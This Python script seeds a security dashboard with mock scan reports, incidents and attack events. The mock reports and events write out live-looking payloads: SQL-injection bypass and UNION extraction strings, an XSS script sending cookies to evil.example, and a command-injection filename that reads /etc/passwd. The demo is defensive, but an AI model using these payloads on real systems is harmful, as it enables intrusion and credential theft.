"""
CyberINK Demo Data Seeder
Run once to populate the dashboard with realistic mock data for demonstration.

Usage:
  python dashboard/demo_seed.py          # seed demo data
  python dashboard/demo_seed.py --clear  # remove demo data only
  python dashboard/demo_seed.py --reset  # clear then re-seed

Demo data is tagged so it never conflicts with real scans.
Real scans, incidents, and events are completely unaffected.
"""

import sys, os, json
from datetime import datetime, timedelta
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
import dashboard.db as db

DEMO_TAG = '_demo'  # username tag for all demo rows

def ts(days_ago=0, hours_ago=0):
    """Return an ISO timestamp relative to now."""
    dt = datetime.utcnow() - timedelta(days=days_ago, hours=hours_ago)
    return dt.strftime('%Y-%m-%d %H:%M:%S')

# ── Scan outputs (realistic, trigger signals & recommendations) ───────────────

OUT_SQL = """\
CYBERSECURITY ASSESSMENT — SQL Injection & Input Validation (WSTG-INPV-05)
Target: shop.tokobaju.id  |  Date: {ts}

=== FINDINGS ===
[CRITICAL] SQL Injection — Authentication Bypass
  URL: https://shop.tokobaju.id/wp-login.php  Parameter: log (POST)
  Payload: admin' OR '1'='1--   Result: bypassed authentication, logged in as admin

[HIGH] SQL Injection — User Data Extraction (UNION-based)
  URL: https://shop.tokobaju.id/api/products?id=1
  Payload: 1 UNION SELECT user_login,user_pass,user_email FROM wp_users--
  Result: 247 user records exposed including password hashes (MD5)

[HIGH] Stored XSS in product review field
  Payload: <script>document.location='https://evil.example/steal?c='+document.cookie</script>
  Result: XSS executes in admin panel — session hijack possible

[MEDIUM] Broken access control — IDOR on order endpoint
  /api/orders/{{id}} returns any user's order when ID is guessed (sequential integers)

[MEDIUM] WordPress version 6.3.1 — outdated (current: 6.5.x)
  Vulnerable plugins detected: WP File Manager 6.9 (CVE-2020-25213 — remote code execution)

=== REMEDIATION PRIORITY ===
1. Implement parameterized queries / prepared statements — eliminate all string-concatenated queries immediately
2. Deploy ModSecurity WAF with OWASP CRS ruleset — block SQL injection and XSS payloads at perimeter
3. Sanitize and escape all user-supplied input before rendering in HTML context
4. Replace sequential order IDs with UUIDs to prevent IDOR enumeration
5. Update WordPress core and all plugins to latest versions immediately — patch CVE-2020-25213
6. Enable database activity monitoring and alert on anomalous query patterns
7. Implement Content Security Policy (CSP) header to mitigate XSS impact
""".format(ts=ts(12))

OUT_AUTH = """\
CYBERSECURITY ASSESSMENT — Authentication Testing (WSTG-AUTHN-01)
Target: shop.tokobaju.id  |  Date: {ts}

=== FINDINGS ===
[HIGH] Brute Force — No rate limiting on login endpoint
  100 login attempts made in 60 seconds without lockout. Credential stuffing feasible.

[HIGH] Weak password policy — minimum 6 characters accepted, common passwords allowed
  Test account 'demo@tokobaju.id' created with password '123456' — no rejection

[MEDIUM] Missing multi-factor authentication (MFA) for admin accounts
  Admin panel accessible with username/password only — no 2FA enforcement

[MEDIUM] Insecure 'Remember Me' — persistent cookie with weak entropy (6-char hex)
  Cookie: remember_token=a3f9c1 — brute-forceable in under 1 hour

[LOW] Username enumeration via timing difference in login responses
  Valid user: 320ms response  |  Invalid user: 45ms response — difference reveals valid accounts

=== REMEDIATION PRIORITY ===
1. Implement account lockout after 5 failed attempts with progressive delay (exponential backoff)
2. Enforce strong password policy — minimum 10 chars, complexity requirements, block top-1000 common passwords
3. Mandate MFA for all admin and privileged accounts — use TOTP or hardware keys
4. Regenerate persistent tokens with 128-bit cryptographic random values (use secrets.token_urlsafe)
5. Add artificial delay to failed logins to eliminate username enumeration timing oracle
""".format(ts=ts(8))

OUT_API = """\
CYBERSECURITY ASSESSMENT — API Security Testing
Target: api.fintech-demo.id  |  Date: {ts}

=== FINDINGS ===
[CRITICAL] Broken Authentication — JWT algorithm confusion (CVE-2022-21449)
  API accepts JWT signed with 'none' algorithm — complete authentication bypass
  curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0...' returns 200

[CRITICAL] Insecure Direct Object Reference (IDOR) — financial transaction data
  GET /api/v1/transactions/{{id}} — sequential integer IDs expose any user's transaction history
  Tested IDs 1000-1050: all returned other users' sensitive financial data

[HIGH] Mass assignment vulnerability — user role escalation
  PATCH /api/v1/users/me accepts 'role' field — setting role=admin grants full privileges

[HIGH] Command injection in PDF export endpoint
  POST /api/v1/reports/export  body: {{"filename":"report;cat /etc/passwd"}}
  Returns contents of /etc/passwd — remote command execution confirmed

[MEDIUM] Sensitive data in API responses — full card numbers returned
  GET /api/v1/payment-methods returns unmasked card numbers and CVV hashes

[MEDIUM] Missing rate limiting on all endpoints — API abuse feasible

=== REMEDIATION PRIORITY ===
1. Validate JWT algorithm server-side — reject 'none' and RS256/HS256 confusion attacks
2. Replace sequential transaction IDs with UUIDs — implement server-side ownership checks
3. Implement input allowlist for all PATCH endpoints — never accept privileged fields from client
4. Sanitize all shell-executed inputs — use subprocess with argument arrays, never shell=True
5. Mask sensitive card data — return only last 4 digits in all API responses
6. Deploy API rate limiting — max 100 requests/minute per authenticated user
7. Implement field-level access control — validate permissions before returning sensitive fields
""".format(ts=ts(5))

OUT_WP = """\
CYBERSECURITY ASSESSMENT — WordPress Security Scan
Target: cms.mediaportal.id  |  Date: {ts}

=== FINDINGS ===
[HIGH] WP-XMLRPC exposed — enabled and accepting remote requests
  Brute force amplification possible (multicall method) — 1 request = 1000 login attempts

[HIGH] Directory listing enabled on /wp-content/uploads/
  Lists all uploaded files including private documents and backup archives

[MEDIUM] Missing HTTP security headers
  X-Frame-Options: NOT PRESENT — clickjacking attack possible
  X-Content-Type-Options: NOT PRESENT — MIME-type sniffing enabled
  Strict-Transport-Security: NOT PRESENT — SSL stripping feasible
  Content-Security-Policy: NOT PRESENT — XSS mitigation absent

[MEDIUM] WordPress admin username exposed via author enumeration
  /?author=1 redirects to /author/superadmin — admin username confirmed as 'superadmin'

[LOW] Server version disclosure — Apache/2.4.51 in Server header
[LOW] PHP version disclosed in X-Powered-By: PHP/7.4.33 — EOL version

=== REMEDIATION PRIORITY ===
1. Disable WP-XMLRPC immediately — add 'deny from all' to xmlrpc.php via .htaccess
2. Disable directory listing — add 'Options -Indexes' in .htaccess for all public directories
3. Add all missing security headers — X-Frame-Options, HSTS, CSP, X-Content-Type-Options
4. Disable author enumeration — redirect /?author=N to homepage or return 404
5. Remove Server and X-Powered-By headers — prevents version fingerprinting
6. Upgrade PHP from 7.4 (EOL) to 8.2+ — critical for security patch coverage
""".format(ts=ts(3))

OUT_NET = """\
CYBERSECURITY ASSESSMENT — Network & Infrastructure Scan
Target: api.fintech-demo.id  |  Date: {ts}

=== FINDINGS ===
[HIGH] SSL/TLS — TLS 1.0 and TLS 1.1 enabled (deprecated protocols)
  POODLE and BEAST attacks possible on older clients

[MEDIUM] Open ports beyond required services
  22/TCP (SSH) — exposed to internet, should be restricted to VPN/bastion
  3306/TCP (MySQL) — DATABASE PORT EXPOSED to public internet
  6379/TCP (Redis) — NO AUTHENTICATION — unauthenticated access to cache store

[MEDIUM] SSH — weak key exchange algorithms accepted (diffie-hellman-group1-sha1)

[LOW] DNS zone transfer allowed — nslookup -type=axfr api.fintech-demo.id returns all records
[LOW] ICMP timestamp response enabled — server clock skew measurable

=== REMEDIATION PRIORITY ===
1. Disable TLS 1.0 and 1.1 — enforce TLS 1.2 minimum with strong cipher suites
2. Restrict MySQL (3306) to localhost only — NEVER expose database ports to internet
3. Enable Redis authentication (requirepass) and bind to 127.0.0.1 only
4. Restrict SSH access to known IP ranges via firewall — use fail2ban for automated blocking
5. Disable DNS zone transfers — configure ACL to allow only authorised secondary nameservers
""".format(ts=ts(1))

OUT_CONF = """\
CYBERSECURITY ASSESSMENT — Configuration & Hardening (WSTG-CONF-01)
Target: shop.tokobaju.id  |  Date: {ts}

=== FINDINGS ===
[MEDIUM] Debug mode enabled in production — error messages expose stack traces and file paths
[MEDIUM] .env file accessible at /.env — exposes database credentials and API keys
[LOW] Default WordPress table prefix 'wp_' in use — aids SQL injection payload crafting
[LOW] Backup files accessible — /shop.tokobaju.id_backup.zip returns 200 (26MB)
[LOW] Server banner reveals: Apache/2.4.54 Ubuntu — fingerprinting facilitated
[INFO] Cookie missing Secure and HttpOnly flags on session token

=== REMEDIATION PRIORITY ===
1. Disable debug mode in all production environments — set WP_DEBUG=false, display_errors=Off
2. Move .env file outside web root or deny access via .htaccess — rotate all exposed credentials
3. Remove all backup archives from web-accessible directories — store offline or in private S3 bucket
4. Suppress server version headers — ServerTokens Prod, ServerSignature Off in Apache config
5. Add Secure; HttpOnly; SameSite=Strict flags to all session cookies
""".format(ts=ts(18))

OUT_SESS = """\
CYBERSECURITY ASSESSMENT — Session Management Testing (WSTG-SESS-01)
Target: shop.tokobaju.id  |  Date: {ts}

=== FINDINGS ===
[HIGH] Session fixation — server accepts client-supplied session ID
  Pre-authentication session ID remains valid post-login — fixation attack confirmed

[HIGH] Predictable session tokens — entropy analysis reveals pattern (timestamp + user_id base64)
  Token: dXNlcl8xMjM= decodes to 'user_123' — trivial to enumerate

[MEDIUM] Sessions not invalidated on logout — old session token valid for 24h after logout
[MEDIUM] Concurrent sessions allowed without limit or notification
[LOW] Long session lifetime — tokens expire after 30 days of inactivity

=== REMEDIATION PRIORITY ===
1. Regenerate session ID after successful authentication — use session_regenerate_id(true)
2. Use cryptographically random session tokens — 128-bit entropy minimum (use secrets.token_urlsafe(32))
3. Invalidate all session tokens server-side on logout — maintain server-side session store
4. Implement concurrent session controls — notify users of new login from unknown device
5. Reduce session lifetime to 8 hours with sliding expiration for idle sessions
""".format(ts=ts(10))

# ── Main seeder ───────────────────────────────────────────────────────────────

def check_existing():
    with db._connect() as con:
        return con.execute(
            "SELECT COUNT(*) FROM scans WHERE username=?", (DEMO_TAG,)
        ).fetchone()[0]

def clear_demo():
    with db._connect() as con:
        con.execute("DELETE FROM scans WHERE username=?", (DEMO_TAG,))
        con.execute("DELETE FROM incidents WHERE rule_id='DEMO'")
        con.execute("DELETE FROM security_events WHERE user_name=?", (DEMO_TAG,))
        con.execute("DELETE FROM blocked_ips WHERE block_reason LIKE '[DEMO]%'")
        con.execute("DELETE FROM remediation_actions WHERE rule_name LIKE 'demo_%'")
        con.execute("DELETE FROM plugins WHERE username=?", (DEMO_TAG,))
        con.commit()
    print("Demo data cleared.")

def seed_scans(con):
    scans = [
        # shop.tokobaju.id
        ("shop.tokobaju.id", "WSTG-INPV-05", OUT_SQL,  22.4, 31, ts(12)),
        ("shop.tokobaju.id", "WSTG-AUTHN-01", OUT_AUTH, 18.7, 24, ts(8)),
        ("shop.tokobaju.id", "WSTG-SESS-01",  OUT_SESS, 14.2, 19, ts(10)),
        ("shop.tokobaju.id", "WSTG-CONF-01",  OUT_CONF, 11.5, 16, ts(18)),
        # api.fintech-demo.id
        ("api.fintech-demo.id", "full_pentest",  OUT_API, 35.8, 47, ts(5)),
        ("api.fintech-demo.id", "WSTG-CONF-07",  OUT_NET, 16.3, 22, ts(1)),
        # cms.mediaportal.id
        ("cms.mediaportal.id", "wordpress_scan", OUT_WP,  20.1, 28, ts(3)),
        ("cms.mediaportal.id", "WSTG-CONF-01",   OUT_CONF, 9.3, 14, ts(6)),
    ]
    ids = []
    for (target, agent, output, lat, tools, created) in scans:
        cur = con.execute(
            "INSERT INTO scans (created_at, target, agent_type, model, status, latency_s, tool_count, output, username) "
            "VALUES (?,?,?,?,?,?,?,?,?)",
            (created, target, agent, "claude-sonnet-4-6", "ok", lat, tools, output, DEMO_TAG)
        )
        ids.append(cur.lastrowid)
    return ids

def seed_incidents(con, scan_ids):
    incidents = [
        ("SQL Injection — Authentication Bypass on shop.tokobaju.id",
         "Critical SQL injection found in wp-login.php. Attacker can bypass authentication entirely using a single payload. 247 user records exposed including MD5 password hashes. Immediate patching required.",
         "CRITICAL", "open", "shop.tokobaju.id", scan_ids[0],
         "Initial Access", "T1190", ts(12)),

        ("IDOR — Financial Transaction Data Exposure on api.fintech-demo.id",
         "Insecure Direct Object Reference in /api/v1/transactions/{id}. Sequential integer IDs allow any authenticated user to read any other user's complete transaction history. Affects all 8,400 registered users.",
         "CRITICAL", "investigating", "api.fintech-demo.id", scan_ids[4],
         "Collection", "T1530", ts(5)),

        ("Stored XSS — Admin Panel Session Hijack Risk on shop.tokobaju.id",
         "Stored cross-site scripting vulnerability in product review input field. Malicious script executes in admin context — enables full session hijack. WooCommerce order management accessible post-exploit.",
         "HIGH", "open", "shop.tokobaju.id", scan_ids[0],
         "Execution", "T1059.007", ts(12)),

        ("Brute Force Attack — 4,200 Login Attempts Detected",
         "Automated credential stuffing attack from 185.220.101.12 (TOR exit node). 4,200 login attempts against shop.tokobaju.id in 40 minutes. 3 accounts compromised. Source IP blocked via Cloudflare WAF.",
         "HIGH", "resolved", "shop.tokobaju.id", None,
         "Credential Access", "T1110.004", ts(7)),

        ("WP File Manager CVE-2020-25213 — Remote Code Execution",
         "WP File Manager plugin v6.9 installed on cms.mediaportal.id. CVE-2020-25213 allows unauthenticated file upload and remote code execution. Plugin is actively exploited in the wild. Immediate update required.",
         "HIGH", "open", "cms.mediaportal.id", scan_ids[6],
         "Execution", "T1203", ts(3)),

        ("Missing Security Headers — Clickjacking & XSS Risk",
         "cms.mediaportal.id is missing X-Frame-Options, Content-Security-Policy, HSTS, and X-Content-Type-Options headers. Combined absence increases attack surface for clickjacking, XSS, and SSL stripping attacks.",
         "MEDIUM", "open", "cms.mediaportal.id", scan_ids[6],
         "Defense Evasion", "T1562", ts(3)),

        ("Redis Exposed Without Authentication — api.fintech-demo.id",
         "Redis instance on port 6379 is bound to 0.0.0.0 with no authentication. Unauthenticated access to session cache confirmed from external IP. FLUSHALL command executable remotely — full cache wipe possible.",
         "HIGH", "investigating", "api.fintech-demo.id", scan_ids[5],
         "Lateral Movement", "T1021", ts(1)),
    ]
    for (title, desc, sev, status, target, sid, tactic, tech, created) in incidents:
        con.execute(
            "INSERT INTO incidents (created_at, updated_at, title, description, severity, status, target, scan_id, mitre_tactic, mitre_technique, rule_id, notes) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
            (created, created, title, desc, sev, status, target, sid, tactic, tech, "DEMO", "")
        )

def seed_events(con):
    events = [
        # SQL injection attempts
        ("sql_injection", "Injection", "CRITICAL", "185.220.101.12", "Russia", "RU", 55.75, 37.62,
         "shop.tokobaju.id", "SQLi payload in login parameter: admin' OR '1'='1--", ts(0, 2)),
        ("sql_injection", "Injection", "HIGH", "49.88.112.75", "China", "CN", 39.90, 116.41,
         "api.fintech-demo.id", "UNION-based SQL injection detected in /api/products?id=", ts(0, 5)),
        ("sql_injection", "Injection", "HIGH", "193.32.162.44", "Netherlands", "NL", 52.37, 4.90,
         "shop.tokobaju.id", "Blind SQL injection probe in search parameter", ts(1, 3)),

        # XSS attempts
        ("xss_attempt", "Injection", "HIGH", "62.102.148.69", "Germany", "DE", 50.11, 8.68,
         "shop.tokobaju.id", "Stored XSS payload in product review: <script>document.cookie</script>", ts(0, 8)),
        ("xss_attempt", "Injection", "MEDIUM", "103.28.54.12", "Indonesia", "ID", -6.21, 106.85,
         "cms.mediaportal.id", "Reflected XSS in search query parameter", ts(2, 1)),

        # Brute force / login failed
        ("login_failed", "Authentication", "HIGH", "185.220.101.12", "Russia", "RU", 55.75, 37.62,
         "shop.tokobaju.id", "4,200 failed login attempts in 40 minutes — credential stuffing", ts(7, 0)),
        ("login_failed", "Authentication", "MEDIUM", "49.88.112.75", "China", "CN", 39.90, 116.41,
         "api.fintech-demo.id", "380 failed API authentication attempts against /auth/login", ts(6, 2)),
        ("login_failed", "Authentication", "MEDIUM", "45.227.255.206", "Brazil", "BR", -23.55, -46.63,
         "shop.tokobaju.id", "Credential stuffing — 250 attempts with leaked password list", ts(5, 4)),
        ("login_failed", "Authentication", "MEDIUM", "95.214.25.38", "Ukraine", "UA", 50.45, 30.52,
         "cms.mediaportal.id", "68 failed wp-admin login attempts", ts(4, 6)),
        ("login_failed", "Authentication", "LOW", "78.138.20.11", "France", "FR", 48.86, 2.35,
         "api.fintech-demo.id", "12 failed login attempts — possible manual testing", ts(3, 3)),

        # Port scans
        ("port_scan", "Reconnaissance", "MEDIUM", "49.88.112.75", "China", "CN", 39.90, 116.41,
         "api.fintech-demo.id", "SYN scan on ports 1-65535 — full port sweep detected", ts(1, 1)),
        ("port_scan", "Reconnaissance", "MEDIUM", "185.220.101.12", "Russia", "RU", 55.75, 37.62,
         "shop.tokobaju.id", "Aggressive Nmap scan — OS fingerprinting + service version detection", ts(2, 5)),
        ("port_scan", "Reconnaissance", "LOW", "193.32.162.44", "Netherlands", "NL", 52.37, 4.90,
         "cms.mediaportal.id", "Service version scan on ports 22, 80, 443, 3306", ts(3, 2)),
        ("port_scan", "Reconnaissance", "LOW", "43.156.47.30", "Singapore", "SG", 1.35, 103.82,
         "api.fintech-demo.id", "Targeted scan on database port 3306 and Redis 6379", ts(0, 14)),

        # Vulnerability detected
        ("vulnerability_detected", "Exploitation", "CRITICAL", "185.220.101.12", "Russia", "RU", 55.75, 37.62,
         "shop.tokobaju.id", "CVE-2020-25213 exploitation attempt on WP File Manager — blocked", ts(3, 7)),
        ("vulnerability_detected", "Exploitation", "HIGH", "49.88.112.75", "China", "CN", 39.90, 116.41,
         "api.fintech-demo.id", "JWT algorithm confusion attack — none algorithm accepted", ts(5, 2)),
        ("vulnerability_detected", "Exploitation", "HIGH", "62.102.148.69", "Germany", "DE", 50.11, 8.68,
         "api.fintech-demo.id", "IDOR exploitation — transaction data enumeration (IDs 1000-1100)", ts(5, 10)),
        ("vulnerability_detected", "Exploitation", "MEDIUM", "103.28.54.12", "Indonesia", "ID", -6.21, 106.85,
         "cms.mediaportal.id", "Directory traversal attempt on /wp-content/uploads/", ts(4, 4)),

        # Unauthorized access
        ("unauthorized_access", "Collection", "HIGH", "185.220.101.12", "Russia", "RU", 55.75, 37.62,
         "api.fintech-demo.id", "Unauthenticated Redis KEYS * command executed — 14,200 keys enumerated", ts(1, 0)),
        ("unauthorized_access", "Collection", "MEDIUM", "45.227.255.206", "Brazil", "BR", -23.55, -46.63,
         "api.fintech-demo.id", "Mass assignment exploit — role=admin field accepted in PATCH /users/me", ts(5, 8)),

        # Command injection
        ("command_injection", "Execution", "CRITICAL", "193.32.162.44", "Netherlands", "NL", 52.37, 4.90,
         "api.fintech-demo.id", "OS command injection in PDF export: filename=report;cat /etc/passwd", ts(5, 6)),

        # Suspicious activity
        ("suspicious_activity", "Discovery", "MEDIUM", "43.156.47.30", "Singapore", "SG", 1.35, 103.82,
         "shop.tokobaju.id", "Automated web crawler enumerating /wp-json/wp/v2/ user endpoints", ts(2, 3)),
        ("suspicious_activity", "Discovery", "LOW", "116.88.45.21", "South Korea", "KR", 37.57, 126.98,
         "cms.mediaportal.id", "WordPress author enumeration via /?author=1 redirect chain", ts(6, 1)),
        ("suspicious_activity", "Exfiltration", "MEDIUM", "185.220.101.12", "Russia", "RU", 55.75, 37.62,
         "shop.tokobaju.id", ".env file accessed — credentials may be exposed", ts(4, 9)),

        # Indonesia-origin events (internal/monitoring)
        ("login_failed", "Authentication", "LOW", "114.5.244.37", "Indonesia", "ID", -6.21, 106.85,
         "cms.mediaportal.id", "5 failed admin login attempts — possible forgotten password", ts(1, 6)),
        ("suspicious_activity", "Discovery", "LOW", "112.215.166.90", "Indonesia", "ID", -7.25, 112.75,
         "shop.tokobaju.id", "Repeated 404 errors on /admin, /phpmyadmin, /cpanel — scanner probe", ts(0, 18)),
    ]
    for (etype, cat, sev, ip, country, cc, lat, lon, target, desc, created) in events:
        con.execute(
            "INSERT INTO security_events "
            "(created_at, event_type, category, severity, ip_address, country, country_code, latitude, longitude, target, user_name, description, raw_data) "
            "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (created, etype, cat, sev, ip, country, cc, lat, lon, target, DEMO_TAG, desc, "")
        )

def seed_blocked_ips(con):
    blocked = [
        ("185.220.101.12", "Russia",      "[DEMO] Brute force — 4,200 login attempts in 40 min",    ts(7)),
        ("49.88.112.75",   "China",        "[DEMO] SQL injection + port scan — repeat offender",     ts(6)),
        ("62.102.148.69",  "Germany",      "[DEMO] Aggressive port scan + XSS payload injection",    ts(3)),
        ("45.227.255.206", "Brazil",       "[DEMO] Credential stuffing — 250 attempts",              ts(5)),
        ("193.32.162.44",  "Netherlands",  "[DEMO] Command injection attempt on PDF export endpoint", ts(5)),
    ]
    for (ip, country, reason, created) in blocked:
        try:
            con.execute(
                "INSERT INTO blocked_ips (created_at, ip_address, country, block_reason, status) VALUES (?,?,?,?,?)",
                (created, ip, country, reason, "active")
            )
        except Exception:
            pass  # skip duplicate IPs

def seed_remediation(con):
    actions = [
        ("demo_brute_force_block", "block_ip", "185.220.101.12",
         '{"rule":"brute_force_block","count":4200,"ip":"185.220.101.12"}',
         "success", "IP blocked via Cloudflare WAF — rule ID cf_demo_001", ts(7)),
        ("demo_sql_injection_block", "block_ip", "49.88.112.75",
         '{"rule":"sql_injection_block","count":3,"ip":"49.88.112.75"}',
         "success", "IP blocked locally — Cloudflare rule applied", ts(6)),
        ("demo_critical_vuln_incident", "create_incident", "shop.tokobaju.id",
         '{"rule":"critical_vuln_incident","count":1}',
         "success", "Incident created: SQL Injection Authentication Bypass", ts(12)),
        ("demo_scanner_block", "block_ip", "193.32.162.44",
         '{"rule":"scanner_block","count":5,"ip":"193.32.162.44"}',
         "success", "Aggressive scanner blocked after 5 probe events in 2 min", ts(3)),
        ("demo_credential_stuffing", "block_ip", "45.227.255.206",
         '{"rule":"credential_stuffing","count":250,"ip":"45.227.255.206"}',
         "success", "Credential stuffing source blocked", ts(5)),
    ]
    for (rule, action, target, params, status, result, created) in actions:
        con.execute(
            "INSERT INTO remediation_actions (created_at, rule_name, action_type, target, parameters, status, result, auto_triggered) "
            "VALUES (?,?,?,?,?,?,?,?)",
            (created, rule, action, target, params, status, result, 1)
        )

def seed_plugins(con):
    plugins = [
        # shop.tokobaju.id (WooCommerce store)
        ("shop.tokobaju.id", "WooCommerce",                    "8.2.1",  "Plugin",  "active", 0),
        ("shop.tokobaju.id", "WooCommerce Stripe Gateway",     "7.6.0",  "Plugin",  "active", 0),
        ("shop.tokobaju.id", "Wordfence Security",             "7.11.1", "Plugin",  "active", 0),
        ("shop.tokobaju.id", "WP Super Cache",                 "1.9.4",  "Plugin",  "active", 0),
        ("shop.tokobaju.id", "Yoast SEO",                      "21.5",   "Plugin",  "active", 0),
        ("shop.tokobaju.id", "WP File Manager",                "6.9",    "Plugin",  "active", 1),  # CVE-2020-25213
        ("shop.tokobaju.id", "Contact Form 7",                 "5.8.2",  "Plugin",  "active", 0),
        # cms.mediaportal.id
        ("cms.mediaportal.id", "Elementor",                    "3.18.3", "Plugin",  "active", 0),
        ("cms.mediaportal.id", "WPForms Lite",                 "1.8.4",  "Plugin",  "active", 0),
        ("cms.mediaportal.id", "Akismet Anti-Spam",            "5.3.1",  "Plugin",  "active", 0),
        ("cms.mediaportal.id", "Really Simple SSL",            "7.2.3",  "Plugin",  "active", 0),
        ("cms.mediaportal.id", "Duplicator",                   "1.5.7",  "Plugin",  "active", 1),  # path traversal
    ]
    for (target, name, version, ptype, status, vuln) in plugins:
        try:
            con.execute(
                "INSERT INTO plugins (target, name, version, plugin_type, status, vulnerable, username) "
                "VALUES (?,?,?,?,?,?,?)",
                (target, name, version, ptype, status, vuln, DEMO_TAG)
            )
        except Exception:
            pass  # skip unique constraint violations on target+name

def main():
    args = sys.argv[1:]

    db.init_db()

    if '--clear' in args:
        clear_demo()
        if '--reset' not in args:
            return

    existing = check_existing()
    if existing > 0 and '--reset' not in args:
        print(f"Demo data already exists ({existing} scans). Use --reset to re-seed or --clear to remove.")
        return

    if existing > 0:
        clear_demo()

    print("Seeding demo data...")
    with db._connect() as con:
        scan_ids = seed_scans(con)
        seed_incidents(con, scan_ids)
        seed_events(con)
        seed_blocked_ips(con)
        seed_remediation(con)
        seed_plugins(con)
        con.commit()

    print(f"""
Demo data seeded successfully!
  Scans:               {len(scan_ids)}
  Incidents:           7
  Security events:     26
  Blocked IPs:         5
  Remediation actions: 5
  Plugins:             12

Targets: shop.tokobaju.id | api.fintech-demo.id | cms.mediaportal.id

Pages populated:
  Dashboard, Security Signals, Incident Management, Threat Analytics,
  Event Timeline, Network Monitor, Recommendations, Priority Actions,
  Remediation, Weaknesses, Inventories, Security Analytics, User Activity Logs

To clear demo data:  python dashboard/demo_seed.py --clear
To re-seed:          python dashboard/demo_seed.py --reset
    """)

if __name__ == '__main__':
    main()
